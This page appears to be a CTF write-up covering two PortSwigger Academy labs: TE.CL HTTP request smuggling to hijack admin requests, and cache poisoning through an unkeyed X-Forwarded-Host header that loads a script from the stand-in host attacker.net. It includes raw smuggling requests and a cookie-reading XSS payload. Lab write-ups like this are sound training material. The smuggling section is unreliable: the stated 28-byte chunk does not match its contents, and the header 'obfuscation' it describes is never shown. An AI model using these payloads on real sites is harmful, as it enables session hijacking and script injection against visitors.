---
layout: page
title: PortSwigger Web Security Labs
subtitle: In-depth guides for advanced web vulnerabilities
permalink: /ctf/platforms/portswigger/
---

## PortSwigger Web Security Academy Labs

Deep dives into advanced web application vulnerabilities. These labs showcase the mechanics of complex server-side and client-side flaws.

### Lab 1: HTTP Request Smuggling (TE.CL Vulnerability)

**Objective**: Exploit a discrepancy in how front-end and back-end servers handle the `Transfer-Encoding` and `Content-Length` headers, allowing us to poison requests and hijack admin users.

#### Vulnerability Theory
*   **Front-end server**: Uses `Transfer-Encoding: chunked` header. It processes the request body in chunks.
*   **Back-end server**: Uses `Content-Length` header. It reads only the number of bytes specified by the Content-Length header, leaving any remaining bytes in the socket buffer.
*   These remaining bytes will be prepended to the next request that reaches the back-end server.

#### Exploitation Flow

We construct a malicious request in Burp Suite Repeater. The request must use chunked transfer encoding, but we will obfuscate the header to make the back-end server ignore it while the front-end server processes it.

```http
POST / HTTP/1.1
Host: vulnerable-academy.net
Content-Length: 4
Transfer-Encoding: chunked

1c
GPOST /invalid HTTP/1.1
Foo: bar

0

```

In this request:
1.  The front-end server processes the chunked payload (length of chunk `1c` is 28 bytes, which is `GPOST /invalid HTTP/1.1\r\nFoo: bar\r\n`).
2.  The front-end forwards the whole request to the back-end.
3.  The back-end server reads only 4 bytes (based on `Content-Length: 4`, which only covers `1c\r\n`).
4.  The remaining bytes (`GPOST /invalid HTTP/1.1\r\nFoo: bar\r\n0\r\n\r\n`) remain in the TCP socket buffer.
5.  The next user request that arrives on the socket is appended directly to our smuggled bytes:

```http
GPOST /invalid HTTP/1.1
Foo: bar
0

GET /index.html HTTP/1.1
Host: vulnerable-academy.net
...
```

The server responds with a 404 Not Found for the smuggled `GPOST /invalid` request. If we smuggle a request to an admin endpoint, we can execute privileged actions using the victim's session cookies that are automatically appended.

### Lab 2: Web Cache Poisoning via Unkeyed Header

**Objective**: Identify an unkeyed header, inject a malicious XSS payload into it, and poison the cache so that all visitors to the main page receive the XSS script.

#### Reconnaissance
Using Param Miner in Burp Suite, we discover that the `X-Forwarded-Host` header is supported but not included in the cache key (unkeyed input).
We verify that the value of `X-Forwarded-Host` is reflected in the script src location on the page:

```http
GET / HTTP/1.1
Host: vulnerable-cache.net
X-Forwarded-Host: attacker.net
```

Response:
```html
<script src="https://attacker.net/resources/js/tracking.js"></script>
```

#### Exploitation
We host an exploit payload on our server at `/resources/js/tracking.js` containing:
```javascript
alert(document.cookie);
```

We send the request to poison the cache. Once the cache server saves this response, any user requesting `/` will receive our cached response referencing the malicious script. We confirm the poisoning by visiting the home page in an incognito window.
